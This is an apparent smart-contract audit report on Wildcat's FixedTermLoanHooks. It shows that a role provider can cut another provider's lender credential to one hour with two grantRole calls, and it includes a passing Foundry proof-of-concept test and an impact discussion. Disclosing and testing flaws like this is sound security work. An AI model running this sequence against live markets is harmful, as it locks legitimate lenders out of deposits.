# Role providers can bypass intended restrictions and lower expiry set by other providers

# Lines of code

https://github.com/code-423n4/2024-08-wildcat/blob/main/src/access/FixedTermLoanHooks.sol#L413


# Vulnerability details

## Proof of Concept
If we look at the code comments, we'll see that role providers can update a user's credential only if at least one of the 3 is true:
- the previous credential's provider is no longer supported, OR
- the caller is the previous role provider, OR
- the new expiry is later than the current expiry

```solidity
  /**
   * @dev Grants a role to an account by updating the account's status.
   *      Can only be called by an approved role provider.
   *
   *      If the account has an existing credential, it can only be updated if:
   *      - the previous credential's provider is no longer supported, OR
   *      - the caller is the previous role provider, OR
   *      - the new expiry is later than the current expiry
   */
  function grantRole(address account, uint32 roleGrantedTimestamp) external {
    RoleProvider callingProvider = _roleProviders[msg.sender];

    if (callingProvider.isNull()) revert ProviderNotFound();

    _grantRole(callingProvider, account, roleGrantedTimestamp);
  }
```

This means that a role providers should not be able to reduce a credential set by another role provider.

However, this could easily be bypassed by simply splitting the call into 2 separate ones:

1. First one to set the expiry slightly later than the currently set one. This would set the role provider to the new one.
2. Second call to reduce the expiry as much as they'd like. Since they're the previous provider they can do that.

## Recommended Mitigation Steps
Fix is non-trivial.


## Assessed type

Context

## Proof of concept (executed against the audited commit)

Test file `test/repair/Poc57.t.sol`, run with `forge test --match-path test/repair/Poc57.t.sol -vv` against the unmodified `src/`.

```solidity
// SPDX-License-Identifier: Apache-2.0
pragma solidity >=0.8.20;

import '../BaseMarketTest.sol';
import { FixedTermLoanHooks } from 'src/access/FixedTermLoanHooks.sol';

/// Real market (deployed through HooksFactory) whose hooks instance is FixedTermLoanHooks.
contract Poc57 is BaseMarketTest {
  FixedTermLoanHooks internal ftHooks;
  address internal providerA;
  address internal providerB;
  address internal victim = address(0xC0FFEE);

  function _getHooksTemplate() internal virtual override returns (address) {
    return LibStoredInitCode.deployInitCode(type(FixedTermLoanHooks).creationCode);
  }

  function setUp() public virtual override {
    startPrank(address(this));
    archController.registerBorrower(borrower);
    stopPrank();
    updateFeeConfiguration(parameters);

    startPrank(borrower);
    ftHooks = FixedTermLoanHooks(hooksFactory.deployHooksInstance(hooksTemplate, ''));
    stopPrank();

    parameters.asset = address(asset = new MockERC20('Token', 'TKN', 18));
    HooksConfig cfg = EmptyHooksConfig
      .setHooksAddress(address(ftHooks))
      .setFlag(Bit_Enabled_Deposit)
      .setFlag(Bit_Enabled_QueueWithdrawal)
      .setFlag(Bit_Enabled_SetAnnualInterestAndReserveRatioBips);
    startPrank(borrower);
    market = WildcatMarket(
      hooksFactory.deployMarket(
        DeployMarketInputs({
          asset: parameters.asset,
          namePrefix: 'Wildcat ',
          symbolPrefix: 'WC',
          maxTotalSupply: parameters.maxTotalSupply,
          annualInterestBips: 1000,
          delinquencyFeeBips: 1000,
          withdrawalBatchDuration: 1 days,
          reserveRatioBips: 2000,
          delinquencyGracePeriod: 2000,
          hooks: cfg
        }),
        abi.encode(block.timestamp + 30 days),
        bytes32(uint256(uint160(borrower)) << 96),
        address(0),
        0
      )
    );
    providerA = address(new MockRoleProvider());
    providerB = address(new MockRoleProvider());
    // Provider A: 365-day credentials. Provider B: 366-day credentials.
    ftHooks.addRoleProvider(providerA, 365 days);
    ftHooks.addRoleProvider(providerB, 366 days);
    stopPrank();

    asset.mint(victim, 10e18);
    startPrank(victim);
    asset.approve(address(market), type(uint256).max);
    stopPrank();
  }

  function _credentialExpiry(address account, uint32 ts, uint32 ttl) internal pure returns (uint256) {
    return uint256(ts) + ttl;
  }

  function test_poc57_providerShortensAnotherProvidersCredential() external {
    uint32 t0 = uint32(block.timestamp);

    // Provider A grants the victim a credential valid for 365 days.
    startPrank(providerA);
    ftHooks.grantRole(victim, t0);
    stopPrank();
    assertEq(ftHooks.getLenderStatus(victim).lastProvider, providerA);
    assertEq(ftHooks.getLenderStatus(victim).lastApprovalTimestamp, t0);
    uint256 expiryBefore = t0 + 365 days;

    // Control: victim can deposit under A's credential.
    uint256 snap = vm.snapshot();
    startPrank(victim);
    market.deposit(1e18);
    stopPrank();
    assertEq(market.balanceOf(victim), 1e18, 'control: deposit succeeds with A credential');
    vm.revertTo(snap);

    // Direct attempt by B to cut A's credential to ~1 hour from now is rejected,
    // as documented in grantRole's natspec.
    uint32 shortTs = uint32(block.timestamp + 1 hours - 366 days);
    startPrank(providerB);
    vm.expectRevert(FixedTermLoanHooks.ProviderCanNotReplaceCredential.selector);
    ftHooks.grantRole(victim, shortTs);

    // Step 1: B grants with a later expiry (t0 + 366 days > t0 + 365 days). Accepted,
    // and B becomes lastProvider.
    ftHooks.grantRole(victim, t0);
    assertEq(ftHooks.getLenderStatus(victim).lastProvider, providerB, 'B took over');
    // Step 2: B is now the previous provider, so it may lower the expiry to ~1 hour.
    ftHooks.grantRole(victim, shortTs);
    stopPrank();

    LenderStatus memory status = ftHooks.getLenderStatus(victim);
    uint256 expiryAfter = uint256(status.lastApprovalTimestamp) + 366 days;
    assertEq(status.lastProvider, providerB);
    assertEq(expiryAfter, block.timestamp + 1 hours, 'expiry cut to one hour');
    assertLt(expiryAfter, expiryBefore, 'expiry is lower than the one A set');
    emit log_named_uint('expiry set by A (seconds from now)', expiryBefore - block.timestamp);
    emit log_named_uint('expiry after B (seconds from now)  ', expiryAfter - block.timestamp);

    // Credential still valid for the hour, then lapses.
    fastForward(1 hours + 1);
    assertGt(block.timestamp, expiryAfter);
    assertLt(block.timestamp, expiryBefore, 'A credential would still be valid');

    // Concrete blocked action: the victim cannot deposit into the market.
    startPrank(victim);
    vm.expectRevert(FixedTermLoanHooks.NotApprovedLender.selector);
    market.deposit(1e18);
    stopPrank();

    // Recoverability: borrower (a provider with no expiry) restores access in one call.
    startPrank(borrower);
    ftHooks.grantRole(victim, uint32(block.timestamp));
    stopPrank();
    startPrank(victim);
    market.deposit(1e18);
    stopPrank();
    assertEq(market.balanceOf(victim), 1e18, 'victim deposits after borrower re-grants');
  }

  /// Provider B (once lastProvider) can also remove the victim outright with revokeRole;
  /// shows the shortening gives no capability beyond what a lastProvider already has.
  function test_poc57_lastProviderCanAlsoRevokeOutright() external {
    uint32 t0 = uint32(block.timestamp);
    startPrank(providerA);
    ftHooks.grantRole(victim, t0);
    stopPrank();
    startPrank(providerB);
    vm.expectRevert(FixedTermLoanHooks.ProviderCanNotRevokeCredential.selector);
    ftHooks.revokeRole(victim);
    ftHooks.grantRole(victim, t0);
    ftHooks.revokeRole(victim);
    stopPrank();
    assertFalse(ftHooks.getLenderStatus(victim).hasCredential());
  }

  /// Borrower alone can already lock any lender out of deposits, with no provider involved.
  function test_poc57_borrowerAlreadyHasThisPower() external {
    startPrank(providerA);
    ftHooks.grantRole(victim, uint32(block.timestamp));
    stopPrank();
    startPrank(borrower);
    ftHooks.blockFromDeposits(victim);
    stopPrank();
    startPrank(victim);
    vm.expectRevert(FixedTermLoanHooks.NotApprovedLender.selector);
    market.deposit(1e18);
    stopPrank();
  }
}
```

Forge output:

```
Warning: Found unknown `fuzz_runs` config for profile `coverage` defined in foundry.toml.
No files changed, compilation skipped
error: unresolved symbol `locals`
   --> src/spherex/SphereXProtectedRegisteredBase.sol:153:39
    |
153 |   ) internal returnsIfNotActivatedPre(locals) returns (ModifierLocals memory locals) {
    |                                       ^^^^^^


Warning: the following cheatcode(s) are deprecated and will be removed in future versions:
  snapshot(): replaced by `snapshotState`
  revertTo(uint256): replaced by `revertToState`
Ran 3 tests for test/repair/Poc57.t.sol:Poc57
[PASS] test_poc57_borrowerAlreadyHasThisPower() (gas: 174146)
[PASS] test_poc57_lastProviderCanAlsoRevokeOutright() (gas: 122507)
[PASS] test_poc57_providerShortensAnotherProvidersCredential() (gas: 629624)
Logs:
  expiry set by A (seconds from now): 31536000
  expiry after B (seconds from now)  : 3600

Suite result: ok. 3 passed; 0 failed; 0 skipped; finished in 3.92ms (1.25ms CPU time)

Ran 1 test suite in 135.76ms (3.92ms CPU time): 3 tests passed, 0 failed, 0 skipped (3 total tests)
```

## Response to the pre-screen checklist

1. **Are malicious role providers in scope despite being borrower-appointed?** The test cannot settle a policy question, so I do not claim it does. What it shows: providers are appointed by the borrower (`addRoleProvider`), and the borrower can already lock any lender out of deposits directly with `blockFromDeposits` (`test_poc57_borrowerAlreadyHasThisPower`). The finding's narrower point is that a provider is documented as unable to reduce another provider's credential, and that documented restriction is directly violated (the direct attempt reverts with `ProviderCanNotReplaceCredential`, the two-call sequence succeeds). Whether that violation counts under the trusted-role treatment is for the judge.
2. **Concrete consequence of shortening the expiry.** `test_poc57_providerShortensAnotherProvidersCredential`: provider A grants the victim a 365-day credential; control deposit of 1e18 succeeds. Provider B's direct cut to one hour reverts. B then calls `grantRole` twice (later expiry first, then earlier). The credential expiry drops from 31,536,000 s to 3,600 s from now. After 1 hour + 1 s, while A's original credential would still be valid, the victim's `market.deposit(1e18)` reverts with `NotApprovedLender`. Recoverability is also shown: the borrower (a no-expiry provider) re-grants in one call and the deposit then succeeds. Limits of the demonstration: a lender that has already deposited is a known lender and keeps withdrawal access, so the blocked action shown is deposit (and transfer-in) access, not withdrawals; and once B is the last provider it could equally call `revokeRole` (`test_poc57_lastProviderCanAlsoRevokeOutright`), so the two-call sequence is the way a provider gets that power over another provider's credential, not a new class of effect.
